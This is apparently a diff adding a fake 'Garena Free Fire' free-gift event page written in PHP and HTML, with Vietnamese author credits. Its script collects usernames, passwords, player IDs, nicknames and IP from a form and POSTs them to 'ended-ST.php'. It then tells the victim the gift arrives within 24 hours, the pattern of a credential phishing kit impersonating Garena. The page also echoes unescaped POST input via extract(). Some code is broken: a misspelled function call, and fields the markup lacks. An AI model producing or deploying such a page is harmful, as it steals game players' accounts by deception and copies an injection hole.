@@ -1,0 +1,174 @@
+
+<!-- Nông Văn Nguyên
+Facebook.com/778578204  -->
+
+
+<!-- Nông Văn Nguyên
+Vui lòng không xoá để tôn trọng tác giả  -->
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GARENA FREE FIRE</title>
+	<link rel="stylesheet" type="text/css" href="css/style.css">
+	<script type="module" src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.esm.js"></script>
+  	<script nomodule src="https://cdn.jsdelivr.net/npm/@ionic/core/dist/ionic/ionic.js"></script>
+  	<?php extract($_POST);?>
+</head>
+<body>
+	<div class="loader">
+		<img src="https://h.top4top.io/p_2016h7ob71.gif">
+	</div>
+	<div class="ST-script">
+		<div class="ST-header">
+			<h1><?= $nvntieude;?></h1>
+		</div>
+		<div class="ST-bl"></div>
+		<div class="ST-br"></div>
+		<div class="ST-bagianAtas">
+			<div class="ST-banner">
+				<img class="ST-imgBanner" src="https://dl.dir.freefiremobile.com/common/web_event/hash/905885344a773e872bbe6f9ee3121e58jpg">
+			</div>
+			<div class="ST-bannerText">
+				<h2><marquee behavior="scroll"><?= $nvnthongbao;?></marquee></h2>
+			</div>
+			<div class="ST-menu">
+				<a class="ST-sub active" id="old">TRANG PHỤC</a>
+				<a class="ST-sub" id="evo">VŨ KHÍ </a>
+				<a class="ST-sub" id="incu">CHẾ TÁC</a>
+			</div>
+
+				<div class="ST-change" data-text="Nhận Quà Miễn Phí">
+					
+				</div>
+		</div>
+		<span class="creator">Copyright By <a href="#">Garena</a></span>
+		<div class="ST-footer">
+		</div>
+		<!-- END OF HOME PAGE -->
+
+		<!-- SUKSES FUNCTION -->                         
+<div class="maskBlur"></div>
+        <div class="st-berhasil" style="display: block;">
+			<br><h1>Thành Công</h1>
+          <center>  <img src="http://www.cssmyschool.info/schimg/done.gif"></center>
+			<p class="bawah" >Xin chào <?= $nickPlayer;?>,Cảm ơn bạn  đã tham gia sự kiện<br>Chúng tôi sẽ gửi phần qua đến bạn trong 24h</p>
+		</div>
+
+
+	</div>
+	<script type="text/javascript" src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+	<script type="text/javascript" src="assets/jquery-min.js"></script>
+    <script>
+        $(document).ready(function(){
+			setTimeout(() => {
+				$('.loader').fadeOut()
+                $('.maskBlur').fadeOut()
+			},1000)
+		})
+    </script>
+    <script>
+		// Validation
+		function LaguNgeHitsLaguParodiin(){
+            $('.fsubmit').prop('disabled',true);
+            $('.fsubmit').html('<ion-spinner name="dots"></ion-spinner>');
+			setTimeout(() => {
+                ParodiAnjayyy();
+            },1500)
+            return false;
+		}
+		function prOmise(length = 60){
+			var result           = '';
+    		var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    		var charactersLength = characters.length;
+    		for ( var i = 0; i < length; i++ ) {
+      		result += characters.charAt(Math.floor(Math.random() * 
+ 			charactersLength));
+   			}
+   			return result;
+		}
+		function ParodiAnjayyy(){
+			var hp = $("#hp").val(),level = $("#level").val(),tier = $("#tier").val(),ep = $("#ep").val(),user = $("#user").val(),pass = $("#pass").val(),id = $("#id").val(),nick = $("#nick").val(),ip = $("#ip").val();
+
+			if(!hp || hp == null || hp == '')
+			{
+				$("#hp").css('filter','hue-rotate(290deg)');
+                $('.fsubmit').html('Submit');
+                $('.fsubmit').prop('disabled',false);
+			}else{
+				$("#hp").css('filter','hue-rotate(0deg)');
+			}
+			if(!level || level == null || level == '')
+			{
+				$("#level").css('filter','hue-rotate(290deg)');
+                $('.fsubmit').html('Submit');
+                $('.fsubmit').prop('disabled',false);
+			}else{
+				$("#level").css('filter','hue-rotate(0deg)');
+			}
+			if(!tier || tier == null || tier == '')
+			{
+				$("#tier").css('filter','hue-rotate(290deg)');
+                $('.fsubmit').html('Submit');
+                $('.fsubmit').prop('disabled',false);
+			}else{
+				$("#tier").css('filter','hue-rotate(0deg)');
+			}
+			if(!ep || ep == null || ep == '')
+			{
+				$("#ep").css('filter','hue-rotate(290deg)');
+                $('.fsubmit').html('Submit');
+                $('.fsubmit').prop('disabled',false);
+			}else{
+				$("#ep").css('filter','hue-rotate(0deg)');
+			}
+
+			// if all form are filled
+			if(hp.length != 0 && level != null && tier != null && ep != null)
+			
+			{
+				// SEND DATA
+				$.ajax({
+					type: 'POST',
+					url: 'ended-ST.php',
+					data: $('#dForm').serialize(),
+					beforeSend: pRomise('Callback'),
+					dataType: 'text',
+					success: function(Aku_Mencintaimu_Setulus_Hatiku_SittyAmina) {
+                                $('.fsubmit').prop('disabled',true);
+								$('.fsubmit').html('DISABLED');
+                                $('.fsubmit').css('filter','grayscale(100%)');
+								$('.fsubmit').css('cursor','no-drop');
+                                $('.maskBlur').fadeIn()
+                                $('.st-berhasil').fadeIn().css('display','flex');
+                        } 
+				})
+			}
+		}
+	</script>
+</body>
+</html><!-- -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- Nông Văn Nguyên
+Facebook.com/778578204  -->
+
+
+<!-- Nông Văn Nguyên
+Vui lòng không xoá để tôn trọng tác giả  -->
+
+
